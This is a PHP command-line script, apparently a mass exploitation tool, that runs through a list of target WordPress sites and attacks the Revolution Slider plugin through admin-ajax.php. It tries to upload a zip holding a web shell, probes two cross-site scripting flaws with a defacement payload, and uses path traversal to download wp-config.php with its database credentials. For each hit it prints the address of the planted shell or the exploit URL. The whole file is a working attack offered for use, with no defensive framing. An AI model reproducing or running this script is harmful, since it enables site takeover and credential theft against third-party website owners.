<?php
/** me@dwisiswanto.my.id **/

/******************************************
 First, install PHP CLI
 USAGE: php exploit.php list-of-target.txt
******************************************/

$cafc = array(
    "file"=>"revslider.zip", // enter a ur shell file into a zip
    "xss"=>"<marquee>CaFc Versace was Here", // for xss
    "kfg"=>"..\wp-config.php" // for download config
);

function hajar($yuerel, $dataAing=null) {
    $cuih = curl_init();
    curl_setopt($cuih, CURLOPT_URL, $yuerel);
    if ($dataAing != null){
        curl_setopt($cuih, CURLOPT_POST, true);
        curl_setopt($cuih, CURLOPT_POSTFIELDS, $dataAing);
    }
    curl_setopt($cuih, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($cuih, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($cuih, CURLOPT_SSL_VERIFYPEER, false);
    $eks = curl_exec($cuih);
    curl_close($cuih);
    return $eks;
}

$site = @file_get_contents($argv[1]);
$tumbal = explode("\r\n", $site);
echo "Calculate the target list : " . count($tumbal);
if (!isset($site)) {
    echo "Site N/A.";
} else {
    foreach ($tumbal as $uri) {
        echo "\n------------------------------------";
        echo "\nTarget => " . $uri;
        echo "\n";
        $menta = hajar($uri . "/wp-admin/admin-ajax.php", array(
            "action" => "revslider_ajax_action",
            "client_action" => "update_plugin",
            "update_file" => $cafc['file'])
        );
        $jason = json_decode($menta, true);
        if ($jason['success'] == false || $jason['message'] == "Wrong request") {
            echo "\nExploit [update_plugin] => NOT VULNERABLE";
        } else {
            echo "\nExploit [update_plugin] => SUCCESS";
            echo "\n[+] " . $uri . "/wp-content/plugins/revslider/temp/update_extract/revslider/YOUR_FILE.php\n";
        }

        $menta2 = hajar($uri . "/wp-admin/admin-ajax.php", array(
            "action" => "revslider_ajax_action",
            "client_action" => "get_captions_css",
            "data" => $cafc['xss'])
        );
        $jasonB = json_decode($menta2, true);
        if ($jasonB['success'] == false || $jason['message'] == "Wrong request") {
            echo "\nExploit [get_captions_css] => NOT VULNERABLE";
        } elseif ($jasonB['success'] == true) {
            echo "\nExploit [get_captions_css] => SUCCESS";
            echo "\n[+] " . $uri . "/wp-admin/admin-ajax.php?";
            echo "action=revslider_ajax_action&";
            echo "client_action=get_captions_css";
            echo "data=" . urlencode($cafc['xss']) . "\n";
        }

        $menta3 = hajar($uri . "/wp-admin/admin-ajax.php", array(
            "action" => "revslider_ajax_action",
            "client_action" => $cafc['xss'])
        );
        $jasonC = json_decode($menta3, true);
        if (preg_match("/wrong ajax action/i", $jasonC['message'])) {
            echo "\nExploit [xss] => SUCCESS";
            echo "\n[+] " . $uri . "/wp-admin/admin-ajax.php?";
            echo "action=revslider_ajax_action";
            echo "client_action=" . urlencode($cafc['xss']) . "\n";
        } else {
            echo "\nExploit [xss] => NOT VULNERABLE";
        }

        $menta4 = hajar($uri . "/wp-admin/admin-ajax.php", array(
            "action" => "revslider_show_image",
            "img" => $cafc['kfg']),
        $uri);
        if ($menta4 == "empty image" || $menta4 == "image file not found" || $menta4 == 0) {
            echo "\nExploit [wp-config] => NOT VULNERABLE\n";
        } else {
            echo "\nExploit [wp-config] => SUCCESS";
            echo "\n[+] " . $uri . "/wp-admin/admin-ajax.php?";
            echo "action=revslider_show_image";
            echo "img=" . $cafc['kfg'] . "\n";
        }
    }
}
?>
